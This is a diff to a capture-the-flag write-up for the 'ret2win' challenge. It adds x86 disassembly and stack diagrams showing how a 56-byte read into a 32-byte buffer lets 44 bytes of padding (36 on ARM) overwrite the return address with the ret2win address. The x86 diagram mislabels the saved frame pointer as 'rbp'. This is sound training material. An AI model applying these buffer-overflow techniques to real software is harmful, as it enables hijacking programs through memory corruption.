@@ -15,13 +15,45 @@ $ nm ret2win
 ...
 ```
 The objective become clear: return from `pwnme` into `ret2win`.
+For all architectures, the buffer overflow is a read of 56 bytes into a 32 bytes buffer.
 
-## x86_64: (`TODO)
+## x86_64: (TODO)
 
-## x86: (TODO)
+## x86:
+```
+08048609 <pwnme + 0x5c>:
+ 8048609:	6a 38            push   0x38
+ 804860b:	8d 45 d8         lea    eax,[ebp-0x28]
+ 804860e:	50               push   eax
+ 804860f:	6a 00            push   0x0
+ 8048611:	e8 9a fd ff ff   call   80483b0 <read@plt>
+...
+0804862a <pwnme + 0x7d>
+ 804862a:	c9                   	leave
+ 804862b:	c3                   	ret
+```
+Since the `leave` instruction is cleaning the stack frame for this function,
+and the read call is writing at `[ebp - 0x28]`, we can deduce that the return address will be
+at `buffer + 0x28 + 0x4 = buffer + 44`. Thus we need 44 bytes of padding, then the ret2win address
+```
+┌─────────────┐ ┌─────────────┐
+│ buffer      │ │ 20 20 20 20 │ <- padding (44 bytes)
+│             │ │ 20 20 20 20 │
+│             │ │ 20 20 20 20 │
+│             │ │ 20 20 20 20 │
+│             │ │ 20 20 20 20 │
+├─────────────┤ │ 20 20 20 20 │
+│ ..          │ │ 20 20 20 20 │
+├─────────────┤ │ 20 20 20 20 │
+│ ...         │ │ 20 20 20 20 │
+├─────────────┤ │ 20 20 20 20 │
+│ old rbp     │ │ 20 20 20 20 │
+├─────────────┤ ├─────────────┤
+│ ret         │ │ 0x804862c   │ <- ret2win address
+└─────────────┘ └─────────────┘
+```
 
 ## ARM:
-As promised, there is a straightforward buffer overflow. 56 bytes into a 32 bytes buffer.
 ```asm
 00010570 <pwnme>:
    10570:	e92d4800 	push	{fp, lr}
@@ -40,7 +72,7 @@ As promised, there is a straightforward buffer overflow. 56 bytes into a 32 byte
    105d4:	e8bd8800 	pop	{fp, pc}
 ```
 In ARMv5, the return address is the `lr` register.   
-So in order to overwrite it, we need 36 bytes of padding, then our ret2win address.   
+So in order to overwrite it, we need 36 bytes of padding, then the ret2win address.   
 ```bash
 ┌─────────────┐  ┌─────────────┐
 │ buffer      │  │ 20 20 20 20 │ <- padding (36 bytes)
@@ -51,7 +83,7 @@ So in order to overwrite it, we need 36 bytes of padding, then our ret2win addre
 │             │  │ 20 20 20 20 │
 │             │  │ 20 20 20 20 │
 ├─────────────┤  │ 20 20 20 20 │
-│ fp          │  │ 20 20 20 20 │
+│ old fp      │  │ 20 20 20 20 │
 ├─────────────┤  ├─────────────┤
 │ lr          │  │ 0x105ec     │ <- ret2win address
 └─────────────┘  └─────────────┘
